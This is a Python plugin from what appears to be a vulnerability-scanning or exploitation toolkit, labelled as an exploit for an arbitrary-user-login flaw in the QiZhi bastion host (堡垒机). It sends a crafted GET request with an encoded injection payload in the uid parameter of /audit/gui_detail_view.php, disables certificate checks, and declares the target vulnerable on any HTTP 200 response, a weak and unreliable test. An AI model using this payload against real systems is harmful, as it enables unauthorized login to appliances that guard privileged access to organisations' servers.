import argparse
from copy import copy

import requests
import urllib3

from plugins.QiZhiFortressMachine import PluginQizhiBase
from utils import output
from utils.consts import AllPluginTypes

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class PluginQizhiAnyUserLogin(PluginQizhiBase):
    display = "齐治堡垒机任意用户登录"
    alias = "qz_userlgn"
    p_type = AllPluginTypes.Exploit

    def __init__(self):
        super().__init__()

    def reg_argument(self, parser: argparse.ArgumentParser):
        parser.description = self.display
        parser.add_argument("-u", "--url", help="target url(http://xxx)", required=True, dest="url")

    def run_script(self, args) -> dict:
        """
        脚本入口函数
        :return: bool
        """
        result = copy(self.result)

        url = args.url
        url1 = url + "/audit/gui_detail_view.php?token=1&id=%5C&uid=%2Cchr(97))%20or%201:%20print%20chr(121)%2bchr(101)%2bchr(115)%0d%0a%23&login=shterm"

        res = requests.get(url=url1, verify=False)
        # print (res.status_code)
        if res.status_code == 200:
            output.success(url1 + " 漏洞存在")

        return result
